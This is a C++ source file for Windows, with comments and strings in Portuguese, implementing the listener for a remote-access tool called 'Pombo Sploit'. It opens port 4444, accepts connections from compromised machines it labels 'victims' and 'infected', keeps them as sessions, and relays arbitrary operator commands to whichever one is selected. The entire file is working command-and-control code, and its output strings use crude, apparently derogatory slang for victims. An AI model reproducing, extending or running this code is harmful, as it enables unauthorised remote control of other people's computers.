#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <thread>
#include <string>
#include <mutex>
#include <map>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")


std::map<int, SOCKET> sessions; 
std::mutex sessions_mutex;     
int next_session_id = 1;     
SOCKET active_target = INVALID_SOCKET; 

// --- FUNÇÃO PARA LIDAR COM UMA ÚNICA VÍTIMA ---
void handle_victim(int session_id, SOCKET client_socket) {
    char buffer[4096] = { 0 };
    std::string victim_ip = "desconhecido";
    sockaddr_in client_addr;
    int addr_len = sizeof(client_addr);

    // Tenta obter o IP da vítima
    if (getpeername(client_socket, (sockaddr*)&client_addr, &addr_len) == 0) {
        victim_ip = inet_ntoa(client_addr.sin_addr);
    }

    std::cout << "PIRIGOIA CAPTURADO!! ID: " << session_id << " (" << victim_ip << ")" << std::endl;

    while (true) {
        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            std::cout << "vitima " << session_id << " (" << victim_ip << ") desconectou." << std::endl;
            // Se a vítima que desconectou era o alvo ativo, reseta o alvo
            if (active_target == client_socket) {
                active_target = INVALID_SOCKET;
                std::cout << "selecione um alvo primeiro." << std::endl;
            }
            break;
        }
        // Só imprime se recebermos dados para evitar linhas vazias
        std::cout << "[sessao " << session_id << "] > " << std::string(buffer, 0, bytes_received) << std::endl;
    }

    // Limpeza ao desconectar
    closesocket(client_socket);
    {
        std::lock_guard<std::mutex> lock(sessions_mutex);
        sessions.erase(session_id);
    }
}

// --- FUNÇÃO DE AJUDA ---
void print_help() {
    std::cout << "Comandos" << std::endl;
    std::cout << "  ajuda          - Mostra esta mensagem de ajuda" << std::endl;
    std::cout << "  lista          - Lista todas as sessoes ativas" << std::endl;
    std::cout << "  alvo <id>      - Seleciona uma sessao para interagir" << std::endl;
    std::cout << "  sair           - Encerra o servidor" << std::endl;
    std::cout << "  <comando>      - Envia um comando para o alvo selecionado" << std::endl;
}

// --- LOOP PRINCIPAL DO SERVIDOR ---
int main() {
    // --- BANNER ---
    // 9 = Azul
    // 15 = Branco Brilhante
    // 7 = Padrão (Cinza)
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9);
    std::cout << R"(
  _____                _           
 |  __ \              | |          
 | |__) |__  _ __ ___ | |__   ___  
 |  ___/ _ \| '_ ` _ \| '_ \ / _ \ 
 | |  | (_) | | | | | | |_) | (_) |
 |_|   \___/|_| |_| |_|_.__/ \___/ 
)" << std::flush;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
    std::cout << R"(
   _____       _       _ _   
  / ____|     | |     (_) |  
 | (___  _ __ | | ___  _| |_ 
  \___ \| '_ \| |/ _ \| | __|
  ____) | |_) | | (_) | | |_ 
 |_____/| .__/|_|\___/|_|\__|
        | |                  
        |_| 
)" << std::flush;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9);
    std::cout << " " << std::endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
    std::cout << std::endl;

    // 1. Inicializar Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "falha ao iniciar Winsock:( :" << iResult << std::endl;
        std::cout << "pressione enter para sair";
        std::cin.get();
        return 1;
    }

    // 2. Criar Socket
    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listener == INVALID_SOCKET) {
        std::cerr << "erro ao criar socket: " << WSAGetLastError() << std::endl;
        WSACleanup();
        std::cout << "pressione enter para sair";
        std::cin.get();
        return 1;
    }

    // 3. Vincular à Porta
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444); // A porta para ouvir
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listener, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "a porta 4444 esta em uso NEGOIA." << std::endl;
        std::cerr << "codigo de erro: " << WSAGetLastError() << std::endl;
        closesocket(listener);
        WSACleanup();
        std::cout << "pressione enter para sair...";
        std::cin.get();
        return 1;
    }

    // 4. Ouvir (Listen)
    if (listen(listener, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "falha ao ouvir (listen)." << std::endl;
        closesocket(listener);
        WSACleanup();
        std::cout << "pressione enter para sair...";
        std::cin.get();
        return 1;
    }

    std::cout << "COMANDOS DE NEGOIA SIGMA: ajuda, lista, alvo" << std::endl;
    std::cout << "ouvindo na porta 4444..." << std::endl << std::endl;

    // --- INÍCIO DA LÓGICA DE THREAD E LOOP ---
    
    // Thread para aceitar novas conexões
    std::thread([&]() {
        std::cout << "aguardando negoia safado" << std::endl;
        while (true) {
            sockaddr_in client_addr;
            int addr_len = sizeof(client_addr);
            
            // accept() BLOQUEIA aqui até uma vítima conectar
            SOCKET client_socket = accept(listener, (sockaddr*)&client_addr, &addr_len);
            if (client_socket == INVALID_SOCKET) {
                std::cout << "erro: " << WSAGetLastError() << std::endl;
                Sleep(1000);
                continue;
            }

            // Se chegamos aqui, uma vítima SE conectou
            std::lock_guard<std::mutex> lock(sessions_mutex);
            int session_id = next_session_id++;
            sessions[session_id] = client_socket;

            // Lança a thread para lidar com esta vítima específica
            std::thread(handle_victim, session_id, client_socket).detach();
        }
    }).detach();

    // Loop do console principal para você digitar comandos
    // Loop principal do console para você digitar comandos
    std::string command;

    while (true) {
        std::cout << "Pombocoto> ";
        std::getline(std::cin, command);

        // 1. Comando para mostrar ajuda
        if (command == "ajuda") {
            print_help();
        }
        
        // 2. Comando para listar sessões ativas (lista)
        else if (command == "lista") {
            std::cout << "--- Negoias Infectados ---" << std::endl;
            std::lock_guard<std::mutex> lock(sessions_mutex);
            if (sessions.empty()) {
                std::cout << "NENHUM NEGOIA PIRIGOIADO" << std::endl;
            } else {
                // Itera pelo mapa de sessões para mostrar ID e tentar pegar o IP
                for (const auto& pair : sessions) {
                    std::cout << "ID: " << pair.first << std::endl;
                    // Nota: O IP já é mostrado quando a vítima conecta, 
                    // mas poderíamos adicionar lógica aqui para mostrar o IP novamente se necessário.
                }
            }
            std::cout << "----------------------" << std::endl;
        }
        
        // 3. Comando para selecionar um alvo
        else if (command.rfind("alvo ", 0) == 0) {
            try {
                // Pega o ID depois de "alvo "
                int id = std::stoi(command.substr(5));
                
                std::lock_guard<std::mutex> lock(sessions_mutex);
                if (sessions.count(id)) {
                    active_target = sessions[id];
                    std::cout << "Negoia selecionado: ID:" << id << std::endl;
                } else {
                    std::cout << "chapou pirigoia?" << std::endl;
                }
            } catch (...) {
                std::cout << "Uso: alvo <id>" << std::endl;
            }
        }
        
        // 4. Comando para sair do servidor
        else if (command == "sair") {
            std::cout << "Matando um pombo...." << std::endl;
            
            // Fecha todos os sockets das vítimas
            std::lock_guard<std::mutex> lock(sessions_mutex);
            for (const auto& pair : sessions) {
                closesocket(pair.second);
            }
            
            // Fecha o socket principal e limpa o Winsock
            closesocket(listener);
            WSACleanup();
            return 0; // Sai do programa
        }
        
        // 5. Enviar comando para o alvo selecionado
        else if (!command.empty()) {
            if (active_target != INVALID_SOCKET) {
                // Envia o comando digitado para a vítima
                send(active_target, command.c_str(), command.length(), 0);
            } else {
                std::cout << "li brozitos selecione um alvo primeiro" << std::endl;
            }
        }
    }

    closesocket(listener);
    WSACleanup();
    return 0;
}